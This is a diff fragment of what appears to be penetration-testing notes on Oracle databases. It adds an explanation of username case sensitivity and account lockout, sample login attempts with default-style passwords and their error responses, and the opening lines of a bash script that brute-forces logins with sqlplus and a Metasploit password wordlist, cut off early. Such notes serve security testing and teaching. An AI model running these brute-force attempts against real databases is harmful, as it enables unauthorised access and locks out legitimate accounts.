@@ -28,7 +28,22 @@ The SID for Oracle identifies the database instance running.  We can use ODAT to
 
 ## Username Brute-force
 
+Generally usernames are not case-sensitive in older Oracle databases, but as of [11g](http://planet.openbravo.com/blog/aware-oracle-11g-login-is-case-sensitive/) this is not the case.  Also they are typically subject to an account lockout on too many password attempts ranging from 5 to 10, as we can see here:
+
 ```
+string = SYSTEM:0RACLE
+ORA-01017: invalid username/password; logon denied
+string = SYSTEM:0RACL3
+ORA-01017: invalid username/password; logon denied
+string = SYSTEM:ORACLE8
+ORA-28000: the account is locked
+```
+
+Lucky for us it will tell us and could be used as a very basic username enumeration method if you're really really desperate.  I'm joking, don't do that.
+
+The following bash script can perform a dirty manual brute-force using sqlplus, so it's important to adjust your path's in this one accordingly: 
+
+```bash
 #!/bin/bash
 INPUT=/usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv
 OLDIFS=$IFS
